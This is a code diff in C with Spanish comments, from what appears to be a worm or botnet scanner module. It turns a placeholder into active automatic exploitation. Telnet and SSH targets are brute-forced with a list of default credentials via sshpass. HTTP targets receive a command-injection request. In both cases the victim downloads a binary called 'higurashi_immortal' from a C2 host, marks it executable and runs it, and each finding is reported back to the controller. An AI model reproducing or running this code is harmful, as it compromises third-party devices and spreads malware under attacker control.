@@ -178,21 +178,45 @@ int auto_exploit_target(HunterTarget *target) {
     
     int success = 0;
     
-    // TODO: Integrar con funciones de exploit cuando se implemente correctamente
-    // Por ahora solo reportamos el hallazgo sin explotar
-    
-    // Simular intento de explotación (placeholder)
-    // En producción, aquí iría la lógica real de exploit
-    usleep(100000); // 100ms simulando ataque
-    
-    // Reportar hallazgo (no explotación por ahora)
-    char find_report[256];
+    // Reportar hallazgo
+    char find_report[512];
     snprintf(find_report, sizeof(find_report), 
-        "🔍 FOUND: %s:%d (%s) - Ready for exploitation", 
+        "{\"type\":\"hunter_found\",\"target\":\"%s:%d (%s)\"}", 
         target->ip, target->port, target->service);
+    send_report("hunter_found", find_report);
     
-    // Por ahora no tenemos acceso a send_report, usar printf
-    printf("%s\n", find_report);
+    // EXPLOTACIÓN AUTOMÁTICA ACTIVADA
+    char exploit_cmd[1024];
+    
+    // Telnet/SSH: Brute force con credenciales comunes
+    if (strcmp(target->service, "telnet") == 0 || strcmp(target->service, "ssh") == 0) {
+        const char *creds[][2] = {
+            {"root", "root"}, {"admin", "admin"}, {"root", "admin"},
+            {"admin", "password"}, {"root", "12345"}, {"user", "user"},
+            {"root", "toor"}, {"admin", "1234"}, {"root", ""}, 
+            {"admin", ""}, {"pi", "raspberry"}, {"ubnt", "ubnt"}
+        };
+        
+        for (int i = 0; i < 12; i++) {
+            snprintf(exploit_cmd, sizeof(exploit_cmd),
+                "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 %s@%s "
+                "'cd /tmp; wget http://%s:8080/higurashi_immortal -O .h; chmod +x .h; ./.h &' 2>/dev/null",
+                creds[i][1], creds[i][0], target->ip, C2_HOST);
+            
+            if (system(exploit_cmd) == 0) {
+                success = 1;
+                break;
+            }
+        }
+    }
+    // HTTP/HTTPS: RCE attempts
+    else if (strcmp(target->service, "http") == 0 || strcmp(target->service, "https") == 0) {
+        // Command injection común
+        snprintf(exploit_cmd, sizeof(exploit_cmd),
+            "curl -m 5 'http://%s:%d/?cmd=wget%%20http://%s:8080/higurashi_immortal%%20-O%%20/tmp/.h%%26chmod%%20+x%%20/tmp/.h%%26/tmp/.h' 2>/dev/null",
+            target->ip, target->port, C2_HOST);
+        system(exploit_cmd);
+    }
     
     /*
     // Telnet: brute force con credenciales
